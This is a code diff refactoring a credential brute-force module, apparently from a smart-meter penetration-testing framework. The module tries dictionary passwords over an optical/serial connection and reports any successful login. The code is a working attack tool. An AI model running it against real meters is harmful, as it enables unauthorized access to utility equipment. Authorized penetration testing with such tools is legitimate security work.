@@ -17,15 +17,15 @@
 #  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 #  MA 02110-1301, USA.
 
-from framework.templates import module_template
+from framework.templates import optical_module_template
 from binascii import unhexlify
 from time import sleep
 import os
 import re
 
-class Module(module_template):
+class Module(optical_module_template):
 	def __init__(self, *args, **kwargs):
-		module_template.__init__(self, *args, **kwargs)
+		optical_module_template.__init__(self, *args, **kwargs)
 		self.version = 2
 		self.author = [ 'Spencer McIntyre <smcintyre@securestate.net>' ]
 		self.description = 'Brute Force Credentials'
@@ -37,29 +37,29 @@ class Module(module_template):
 		self.advanced_options.addBoolean('STOPONSUCCESS', 'stop after the first successful login', default = True)
 		self.advanced_options.addFloat('DELAY', 'time in seconds to wait between attempts', default = 0.20)
 	
-	def run(self, frmwk):
-		conn = frmwk.serial_connection
+	def run(self):
+		conn = self.frmwk.serial_connection
+		logger = self.logger
 		usehex = self.options.getOptionValue('USEHEX')
 		dictionary_path = self.options.getOptionValue('DICTIONARY')
 		username = self.options.getOptionValue('USERNAME')
 		userid = self.options.getOptionValue('USERID')
-		logger = frmwk.get_module_logger(self.name)
 		time_delay = self.advanced_options.getOptionValue('DELAY')
 		
 		if len(username) > 10:
-			frmwk.print_error('Username cannot be longer than 10 characters')
+			self.frmwk.print_error('Username cannot be longer than 10 characters')
 			return
 		if not (0 <= userid <= 0xffff):
-			frmwk.print_error('User id must be between 0 and 0xffff')
+			self.frmwk.print_error('User id must be between 0 and 0xffff')
 			return
 		if not os.path.isfile(dictionary_path):
-			frmwk.print_error('Can not find dictionary path')
+			self.frmwk.print_error('Can not find dictionary path')
 			return
 		
 		password_list = open(dictionary_path, 'r')
 		hex_regex = re.compile('^([0-9a-fA-F]{2})+$')
 		
-		frmwk.print_status('Starting brute force')
+		self.frmwk.print_status('Starting brute force')
 		
 		password = password_list.readline()
 		while password:
@@ -67,7 +67,7 @@ class Module(module_template):
 				password = password.strip()
 				if hex_regex.match(password) == None:
 					logger.error('invalid characters found while searching for hex')
-					frmwk.print_error('Invalid characters found while searching for hex')
+					self.frmwk.print_error('Invalid characters found while searching for hex')
 					password_list.close()
 					return
 				password = unhexlify(password)
@@ -85,9 +85,9 @@ class Module(module_template):
 			sleep(time_delay)
 			if conn.login(username, userid, password):
 				if usehex:
-					frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password.encode('hex'))
+					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password.encode('hex'))
 				else:
-					frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password)
+					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password)
 				if self.advanced_options.getOptionValue('STOPONSUCCESS'):
 					conn.stop()
 					break
